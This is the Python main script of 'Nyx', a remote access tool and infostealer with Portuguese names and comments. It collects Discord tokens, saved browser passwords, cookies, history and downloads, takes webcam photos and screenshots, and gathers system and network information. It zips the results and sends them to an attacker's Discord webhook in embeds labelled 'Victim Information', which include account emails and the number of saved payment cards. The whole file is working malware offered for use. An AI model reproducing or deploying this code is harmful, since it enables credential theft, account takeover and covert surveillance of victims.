import subprocess
import requests
import os
import json
import sys
import zipfile
from plugins.systeminfo import obter_informacoes_sistema
from plugins.discordtoken import TokenExtractor
from plugins.webcam import capture_photo
from plugins.userinfo import UserInfos
from plugins.operationsystem import get_os_info
from plugins.password import PasswordExtractor
from plugins.downloads import BrowserDownloadsExtractor
from plugins.history import BrowserDataExtractor
from plugins.cookies import CookieExtractor
from plugins.print import Sprint, save_image
from plugins.network import obter_informacoes_internet
from datetime import datetime
from multiprocessing import freeze_support


webhook_avatar = "https://cdn.discordapp.com/attachments/1284297215770234900/1284297297223487552/image.png?ex=66e61e90&is=66e4cd10&hm=e8a738f0ab2a7ec1859cf40150a5e768604cc3d19479c8f0000e19334915953a&"
webhook_username = "Nyxbot"

appdata_local = os.getenv('LOCALAPPDATA')
pasta_nyx = os.path.join(appdata_local, 'Nyx')
if not os.path.exists(pasta_nyx):
    os.makedirs(pasta_nyx)
zip_file_path = os.path.join(appdata_local, 'nyx_credentials.zip')

def load_config():
    config_path = os.path.join(sys._MEIPASS, 'config.json') if hasattr(sys, '_MEIPASS') else 'config.json'
    with open(config_path, 'r') as f:
        print(f)
        return json.load(f)
        

executou_informacoes_sistema = False
executou_discord_info = False
executou_webcam_foto = False
executou_screenshot = False
executou_password_extractor = False
executou_browser_downloads = False
executou_browser_history = False
executou_cookie_extractor = False
executou_network_info = False

def executar_comando(comando):
    try:
        resultado = subprocess.check_output(comando, shell=True, text=True)
        return resultado
    except subprocess.CalledProcessError as e:
        return f"Erro ao executar o comando: {e}"

def enviar_imagem_para_discord(caminho_foto):
    with open(caminho_foto, 'rb') as imagem:
        files = {'file': imagem}
        payload = {
            'username': webhook_username,
            'avatar_url': webhook_avatar,
        }
        response = requests.post(DISCORD_WEBHOOK_URL, data=payload, files=files)
        if response.status_code != 200:
            print(f"Erro ao enviar para o Discord: {response.status_code} - {response.text}")

def enviar_arquivo_zip_webhook(zip_file, arquivos_info):
    with open(zip_file, 'rb') as file:
        bash_content = " \n"
        for info in arquivos_info:
            bash_content += f" '{info}'\n"
        bash_content += " "
        
        embed = {
            "title": "Credentials",
            "description": f"```python\n{bash_content}\n```",
        }
        
        payload = {
            'username': webhook_username,
            'avatar_url': webhook_avatar,
            'embeds': [embed]
        }
        
        files = {
            'file': ('arquivo.zip', file, 'application/zip')
        }
        
        response = requests.post(DISCORD_WEBHOOK_URL, 
                                 data={'payload_json': json.dumps(payload)}, 
                                 files=files)
    
    if response.status_code == 200:
        print('Arquivo enviado com sucesso.')
    else:
        print(f'Erro ao enviar o arquivo: {response.status_code}, {response.text}')

def enviar_para_discord(mensagem, embed=None):
    payload = {
        'username': webhook_username,
        'avatar_url': webhook_avatar
    }
    
    if embed:
        payload['embeds'] = [embed]
    else:
        payload['content'] = mensagem

    response = requests.post(DISCORD_WEBHOOK_URL, json=payload)
    if response.status_code != 204:
        print(f"Erro ao enviar para o Discord: {response.status_code} - {response.text}")

def executar_password_extractor():
    global executou_password_extractor
    if not executou_password_extractor:
        try:
            navegadores_suportados = ['Chrome', 'Firefox', 'Edge', 'Opera', 'Brave']
            for navegador in navegadores_suportados:
                navegador_map = {
                    'Chrome': 'chrome',
                    'Firefox': 'firefox',
                    'Edge': 'edge',
                    'Opera': 'opera',
                    'Brave': 'brave'
                }

                navegador_convertido = navegador_map[navegador]
                extractor = PasswordExtractor(navegador_convertido)
                passwords = extractor.get_passwords()

                if passwords:
                    passwords_file_path = os.path.join(pasta_nyx, f"{navegador_convertido}_passwords.txt")
                    extractor.save_passwords_to_file(passwords, passwords_file_path)

            executou_password_extractor = True
        except Exception as e:
            print(f"Erro ao executar PasswordExtractor: {e}")

def executar_browser_downloads():
    global executou_browser_downloads
    if not executou_browser_downloads:
        try:
            navegadores_suportados = ['Chrome', 'Firefox', 'Edge', 'Opera', 'Brave']
            for navegador in navegadores_suportados:
                navegador_map = {
                    'Chrome': 'chrome',
                    'Firefox': 'firefox',
                    'Edge': 'edge',
                    'Opera': 'opera',
                    'Brave': 'brave'
                }

                navegador_convertido = navegador_map[navegador]
                extractor = BrowserDownloadsExtractor(navegador_convertido)
                downloads = extractor.get_downloads()

                if downloads:
                    downloads_file_path = os.path.join(pasta_nyx, f"{navegador_convertido}_downloads.txt")
                    extractor.save_downloads_to_file(downloads, downloads_file_path)

            executou_browser_downloads = True
        except Exception as e:
            print(f"Erro ao executar BrowserDownloadsExtractor: {e}")

def executar_browser_history():
    global executou_browser_history
    if not executou_browser_history:
        try:
            navegadores_suportados = ['Chrome', 'Firefox', 'Edge', 'Opera', 'Brave']
            for navegador in navegadores_suportados:
                navegador_map = {
                    'Chrome': 'chrome',
                    'Firefox': 'firefox',
                    'Edge': 'edge',
                    'Opera': 'opera',
                    'Brave': 'brave'
                }

                navegador_convertido = navegador_map[navegador]
                extractor = BrowserDataExtractor(navegador_convertido)
                history = extractor.get_history()

                if history:
                    history_file_path = os.path.join(pasta_nyx, f"{navegador_convertido}_history.txt")
                    extractor.save_history_to_file(history, history_file_path)

            executou_browser_history = True
        except Exception as e:
            print(f"Erro ao executar BrowserDataExtractor: {e}")

def executar_cookie_extractor():
    global executou_cookie_extractor
    if not executou_cookie_extractor:
        try:
            navegadores_suportados = ['Chrome', 'Firefox', 'Edge', 'Opera', 'Brave']
            for navegador in navegadores_suportados:
                navegador_map = {
                    'Chrome': 'chrome',
                    'Firefox': 'firefox',
                    'Edge': 'edge',
                    'Opera': 'opera',
                    'Brave': 'brave'
                }

                navegador_convertido = navegador_map[navegador]
                extractor = CookieExtractor(navegador_convertido)
                cookies = extractor.get_cookies()

                if cookies:
                    cookies_file_path = os.path.join(pasta_nyx, f"{navegador_convertido}_cookies.txt")
                    extractor.save_cookies_to_file(cookies, cookies_file_path)

            executou_cookie_extractor = True
        except Exception as e:
            print(f"Erro ao executar CookieExtractor: {e}")

def criar_embed_com_imagens(caminho_foto1, caminho_foto2):
    return {
        'title': 'Fotos',
        'description': 'Capturas de tela e foto da webcam',
        'color': 0xFF8C00,
        'fields': [
            {
                'name': 'Screenshot',
                'value': '![Screenshot](attachment://prtscr.png)',
                'inline': True
            },
            {
                'name': 'Foto da Webcam',
                'value': '![Webcam](attachment://webcam_foto.jpg)',
                'inline': True
            }
        ],\
        'image': {
            'url': 'attachment://webcam_foto.jpg'
        }
    }

if __name__ == "__main__":
    freeze_support()

    cfg = load_config()
    DISCORD_WEBHOOK_URL = cfg.get("WEBHOOK") 


    try:
        embed_content = ""
        
        if cfg.get("user_info", False):
            user_info_instance = UserInfos()
            user_info = user_info_instance.get_user_info()
            user_info_message = '\n'.join(f"{key}: {value}" for key, value in user_info.items())
            embed_content += "**Informações do Usuário**\n```bash\n" + user_info_message + "\n```\n\n"

        if cfg.get("os_info", False):
            os_info = get_os_info()
            embed_content += "**Informações do Sistema Operacional**\n```bash\n" + os_info + "\n```\n\n"
        
        if not executou_informacoes_sistema and cfg.get("system_info", False):
            informacoes_sistema = obter_informacoes_sistema()
            executou_informacoes_sistema = True
            embed_content += "**Informações do Sistema**\n```bash\n" + informacoes_sistema + "\n```\n\n"

        if not executou_network_info and cfg.get("network_info", False):
            network_info = obter_informacoes_internet()
            executou_network_info = True
            embed_content += "**Informações de Internet**\n```bash\n" + network_info + "\n```\n\n"

        if embed_content:
            combined_embed = {
                'title': 'Victim Information',
                'description': f"{embed_content.strip()}\n\n[GitHub Repository](https://github.com/Faccin27/Nyx---Stealthy-Remote-Access-Tool-RAT)",  
                'footer': {
                    'text': 'GitHub Repository',
                    'icon_url': 'https://github.com/fluidicon.png'  
                },
                'author': {
                    'name': 'Nyx Rat',
                    'url': 'https://github.com/Faccin27/Nyx---Stealthy-Remote-Access-Tool-RAT',
                    'icon_url': 'https://raw.githubusercontent.com/Faccin27/Nyx---Stealthy-Remote-Access-Tool-RAT/main/assets/images/image.png' 
                }
            }
            enviar_para_discord('', embed=combined_embed)



        if not executou_discord_info and cfg.get("discord_info", False) :
            discord_info = TokenExtractor()
            discord_info.extract_tokens()
            executou_discord_info = True
            for token in discord_info.tokens:
                user_data = discord_info.get_user_data(token)
                if user_data:
                    avatar_url = f"https://cdn.discordapp.com/avatars/{user_data['id']}/{user_data['avatar']}.png"
                    
                    discord_embed = {
                        'title': 'Victim Discord',
                        'description': f"{embed_content.strip()}\n\n[GitHub Repository](https://github.com/Faccin27/Nyx---Stealthy-Remote-Access-Tool-RAT)",  
                        'footer': {
                            'text': 'GitHub Repository',
                            'icon_url': 'https://github.com/fluidicon.png'  
                        },
                        'description': f"Nome de usuário: {user_data['username']}\n"
                                    f"E-mail: {user_data.get('email', 'Não disponível')}\n"
                                    f"Nitro: {'Sim' if user_data.get('premium_type') else 'Não'}\n"
                                    f"Token: ```{token}```",
                        'thumbnail': {
                            'url': avatar_url
                        },
                                        'author': {
                    'name': 'Nyx Rat',
                    'url': 'https://github.com/Faccin27/Nyx---Stealthy-Remote-Access-Tool-RAT',
                    'icon_url': 'https://raw.githubusercontent.com/Faccin27/Nyx---Stealthy-Remote-Access-Tool-RAT/main/assets/images/image.png' 
                }
                    }

                    payment_sources = discord_info.get_payment_sources(token)
                    if payment_sources:
                        discord_embed['description'] += f"\nCartões de crédito: {len(payment_sources)}"
                    else:
                        discord_embed['description'] += "\nNenhum cartão de crédito registrado"

                    subscriptions = discord_info.get_nitro_subscription(token)
                    if subscriptions:
                        for sub in subscriptions:
                            renew_timestamp = sub.get("current_period_end")
                            if renew_timestamp:
                                expiration_date = datetime.fromtimestamp(renew_timestamp / 1000).strftime('%Y-%m-%d %H:%M:%S')
                                discord_embed['description'] += f"\nNitro expira em: {expiration_date}"
                            else:
                                discord_embed['description'] += "\nNitro ativo, mas sem data de expiração disponível"

                    enviar_para_discord('', embed=discord_embed)
        


        if not executou_webcam_foto and cfg.get("webcam_photo", False):
            webcam_foto = capture_photo()
            executou_webcam_foto = True
            webcam_path = os.path.join(pasta_nyx, 'webcam_foto.jpg')
            enviar_imagem_para_discord(webcam_path)
        
        if not executou_screenshot and cfg.get("screenshot", False):
            screenshot = Sprint()
            screenshot_path = os.path.join(pasta_nyx, 'prtscr.png')
            save_image(screenshot, screenshot_path)
            executou_screenshot = True
            if os.path.exists(screenshot_path):
                enviar_imagem_para_discord(screenshot_path)


        if cfg.get("password", False):
            executar_password_extractor()

        if cfg.get("browser_downloads", False):
            executar_browser_downloads()
        
        if cfg.get("browser_history", False):
            executar_browser_history()

        if cfg.get("cookies", False):
            executar_cookie_extractor()

        if not os.path.exists(pasta_nyx):
            print(f"A pasta '{pasta_nyx}' não existe.")
        else:
            arquivos_info = []
            for root, dirs, files in os.walk(pasta_nyx):
                for file in files:
                    file_path = os.path.join(root, file)
                    file_size = os.path.getsize(file_path)
                    file_size_kb = file_size / 1024
                    arquivos_info.append(f"{file} ({file_size_kb:.2f}kb)")

            print("Arquivos encontrados:")
            for info in arquivos_info:
                print(info)

            with zipfile.ZipFile(zip_file_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for root, dirs, files in os.walk(pasta_nyx):
                    for file in files:
                        file_path = os.path.join(root, file)
                        zipf.write(file_path, os.path.relpath(file_path, pasta_nyx))

            print(f"Pasta 'Nyx' compactada em: {zip_file_path}")

            enviar_arquivo_zip_webhook(zip_file_path, arquivos_info)

    except Exception as e:
        print(f"Ocorreu um erro durante a execução do script: {e}")